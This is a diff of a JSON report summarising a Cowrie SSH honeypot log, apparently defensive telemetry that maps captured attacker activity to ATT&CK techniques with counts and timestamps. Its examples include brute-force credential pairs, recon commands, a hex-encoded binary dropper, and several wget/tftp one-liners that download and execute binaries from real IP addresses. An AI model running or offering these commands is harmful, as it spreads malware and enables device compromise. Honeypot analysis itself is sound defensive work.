@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-26 19:04:54",
+  "generated": "2026-09-26 20:03:51",
   "totals": {
-    "commands": 4358,
-    "login_failed": 7206,
-    "login_success": 820,
-    "sessions": 6450
+    "commands": 8739,
+    "login_failed": 7304,
+    "login_success": 830,
+    "sessions": 6566
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 7206,
+      "count": 7304,
       "examples": [
         "gizelle / gizelle",
         "gizelle / gizelle1",
@@ -21,14 +21,14 @@
         "gizelle / gizelle12345"
       ],
       "first": "2026-09-26T00:00:54.368774Z",
-      "last": "2026-09-26T19:03:29.988235Z",
-      "unique_ips": 126
+      "last": "2026-09-26T20:03:47.845950Z",
+      "unique_ips": 131
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 1001,
+      "count": 1013,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/;",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/;",
@@ -37,14 +37,14 @@
         ">/dev/shm/.f && chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/;"
       ],
       "first": "2026-09-26T00:13:52.548336Z",
-      "last": "2026-09-26T18:59:02.210887Z",
-      "unique_ips": 56
+      "last": "2026-09-26T19:35:42.887610Z",
+      "unique_ips": 57
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 820,
+      "count": 830,
       "examples": [
         "root / a1sev5y7c39k",
         "root / root",
@@ -53,8 +53,8 @@
         "lghkel\\x09 / zpz}ld\\x09"
       ],
       "first": "2026-09-26T00:10:34.067165Z",
-      "last": "2026-09-26T18:58:58.480504Z",
-      "unique_ips": 95
+      "last": "2026-09-26T19:59:44.067886Z",
+      "unique_ips": 98
     },
     {
       "id": "T1083",
@@ -75,7 +75,7 @@
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 276,
+      "count": 289,
       "examples": [
         "cat /proc/cpuinfo | grep name | wc -l",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
@@ -84,14 +84,14 @@
         "cat /proc/cpuinfo | grep model | grep name | wc -l"
       ],
       "first": "2026-09-26T00:18:56.619625Z",
-      "last": "2026-09-26T18:18:25.370950Z",
-      "unique_ips": 46
+      "last": "2026-09-26T19:59:44.874761Z",
+      "unique_ips": 48
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 114,
+      "count": 126,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -100,7 +100,7 @@
         "wget -q -O .r http://201.7.16.231/bins/ouroboros.mips; chmod +x .r; ./.r; rm -f .r"
       ],
       "first": "2026-09-26T00:18:50.025908Z",
-      "last": "2026-09-26T18:59:03.084421Z",
+      "last": "2026-09-26T19:35:21.487221Z",
       "unique_ips": 34
     },
     {
@@ -212,31 +212,31 @@
   "unmapped": [
     [
       "sh",
-      736
+      738
     ],
     [
       "system",
-      735
+      737
     ],
     [
       "/bin/busybox HISILICON",
-      213
+      216
     ],
     [
       "shell",
-      157
+      159
     ],
     [
       "enable",
-      153
+      155
     ],
     [
       "ping; sh",
-      142
+      144
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      71
+      72
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -245,6 +245,10 @@
     [
       "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found",
       14
+    ],
+    [
+      "echo -ne \"\\x41\\x89\\xd4\\x45\\x0f\\xb6\\xe4\\x55\\x53\\x48\\x89\\xcb\\x48\\x83\\xec\\x58\\x40\\x88\\x7c\\x24\\x07\\x40\\x0f\\xb6\\xff\\xe8\\x62\\x",
+      12
     ],
     [
       "zalee",
@@ -263,32 +267,28 @@
       9
     ],
     [
-      "/bin/busybox UNSTABLE",
-      4
-    ],
-    [
-      "linuxshell",
-      2
-    ],
-    [
-      "enablelinuxshell",
-      2
-    ],
-    [
-      "ping ;sh",
-      2
-    ],
-    [
-      "cd /proc && cat self/cmdline",
-      2
-    ],
-    [
       "echo SHELL_TEST",
-      2
+      9
     ],
     [
       "/bin/busybox TEST",
-      2
+      9
+    ],
+    [
+      "cat /proc",
+      9
+    ],
+    [
+      "./",
+      9
+    ],
+    [
+      "cd /tmp",
+      7
+    ],
+    [
+      "echo x >/tmp/.t 2>/dev/null && echo W_OK_/tmp && rm -f /tmp/.t",
+      6
     ]
   ]
 }
